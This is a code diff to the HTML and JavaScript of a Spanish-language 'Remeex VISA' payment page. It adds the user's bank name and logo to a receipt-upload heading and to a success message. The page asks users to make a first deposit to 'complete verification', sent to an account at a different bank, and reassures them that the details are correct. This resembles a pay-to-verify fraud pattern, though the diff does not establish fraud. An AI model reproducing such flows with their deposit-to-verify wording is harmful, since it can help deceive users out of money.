@@ -6394,7 +6394,10 @@
         </div>
         
         <div class="section-title" style="margin-top: 1.5rem; margin-bottom: 1rem;">
-          <i class="fas fa-upload"></i> Comprobante de Pago
+          <i class="fas fa-upload"></i>
+          Comprobante de recarga vía pago móvil desde tu banco
+          <img id="receipt-bank-logo" class="bank-logo-mini" alt="Logo del banco" style="display:none;">
+          <span id="receipt-bank-name"></span>
         </div>
         
         <div class="receipt-upload" id="receipt-upload">
@@ -6447,8 +6450,15 @@
             <i class="fas fa-check-circle"></i>
           </div>
           <div class="mobile-payment-success-content">
-            <div class="mobile-payment-success-title">¡Felicidades! Tus datos para recargar tu cuenta de Remeex VISA.</div>
-            <div class="mobile-payment-success-text">Haz tu primera recarga por <span id="verification-usd">$0.00</span> (<span id="verification-bs">Bs 0,00</span> a la tasa de <span id="verification-rate">0,00</span> Bs por dólar) para culminar tu verificación! Ahora tiene sus datos personales configurados para recibir pagos móviles. Puede compartir estos datos con quienes deseen enviarte dinero en Bolívares.</div>
+          <div class="mobile-payment-success-title">¡Felicidades! Tus datos para recargar tu cuenta están listos.</div>
+          <div class="mobile-payment-success-text">
+            Haz tu primera recarga desde
+            <img id="mobile-bank-logo" class="bank-logo-mini" alt="Logo del banco" style="display:none;">
+            <span id="mobile-bank-name"></span>
+            por <span id="verification-usd">$0.00</span>
+            (<span id="verification-bs">Bs 0,00</span> a la tasa de <span id="verification-rate">0,00</span> Bs por dólar)
+            para culminar tu verificación. Ahora tiene sus datos personales configurados para recibir pagos móviles. Puede compartir estos datos con quienes deseen enviarte dinero en Bolívares.
+          </div>
           </div>
         </div>
         <div class="bank-note" id="mobile-payment-note" style="display: none;">No se preocupe, los datos son correctos. Sabemos que su banco principal es <strong><span id="user-bank-name"></span></strong>, pero para su primera recarga le proporcionamos una cuenta en el <strong>Banco Venezolano de Crédito</strong>. Realice la transferencia desde su <strong><span id="user-bank-name-2"></span></strong> o reciba fondos de cualquier persona utilizando estos datos.</div>
@@ -8869,10 +8879,27 @@ function stopVerificationProgress() {
 
       const bankNameEl1 = document.getElementById('user-bank-name');
       const bankNameEl2 = document.getElementById('user-bank-name-2');
+      const bankNameDisplay = document.getElementById('mobile-bank-name');
+      const bankLogoDisplay = document.getElementById('mobile-bank-logo');
+      const receiptBankName = document.getElementById('receipt-bank-name');
+      const receiptBankLogo = document.getElementById('receipt-bank-logo');
       const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
       const bankName = BANK_NAME_MAP[reg.primaryBank] || '';
+      const bankLogo = typeof getBankLogo === 'function' ? getBankLogo(reg.primaryBank) : '';
       if (bankNameEl1) bankNameEl1.textContent = bankName;
       if (bankNameEl2) bankNameEl2.textContent = bankName;
+      if (bankNameDisplay) bankNameDisplay.textContent = bankName;
+      if (bankLogoDisplay) {
+        bankLogoDisplay.src = bankLogo;
+        bankLogoDisplay.alt = bankName;
+        bankLogoDisplay.style.display = bankLogo ? 'inline' : 'none';
+      }
+      if (receiptBankName) receiptBankName.textContent = bankName;
+      if (receiptBankLogo) {
+        receiptBankLogo.src = bankLogo;
+        receiptBankLogo.alt = bankName;
+        receiptBankLogo.style.display = bankLogo ? 'inline' : 'none';
+      }
       
       const nameCopyBtn = document.querySelector('#mobile-payment-name .copy-btn');
       const rifCopyBtn = document.querySelector('#mobile-payment-rif .copy-btn');
